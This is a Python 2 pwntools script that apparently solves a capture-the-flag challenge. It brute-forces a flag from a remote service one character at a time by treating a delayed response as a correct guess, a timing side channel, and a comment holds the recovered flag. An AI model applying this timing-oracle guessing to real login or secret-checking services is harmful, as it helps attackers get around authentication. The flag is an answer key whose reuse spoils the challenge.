from pwn import *


host = "58.152.223.96"
port = 8001


#vxctf{3nj0y_4nd_w417_a10ne}

r = remote(host,port)

char_set="!@#$%^&*()-_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

payload='vxctf{3nj0y_4nd_w417_1XAAA}'



#start from 6
correct=19

wrong=27-correct

r.recvuntil('Enter your guess:')
r.sendline(payload)

#got0.1s latency
char_pointer=0

while(wrong):

    if(r.recvuntil('Wrong! Try again.',timeout=((0.6)+correct*0.5))==''):

        char_pointer=0
        correct+=1
        wrong-=1

        print payload
        r.recvuntil('Enter your guess:')
        r.sendline(payload)

        

    else:
        

        payload=payload[:correct]+char_set[char_pointer]+payload[correct+1:]
        
        char_pointer+=1

        print payload+' failed'

        r.recvuntil('Enter your guess:')

        r.sendline(payload)




##27
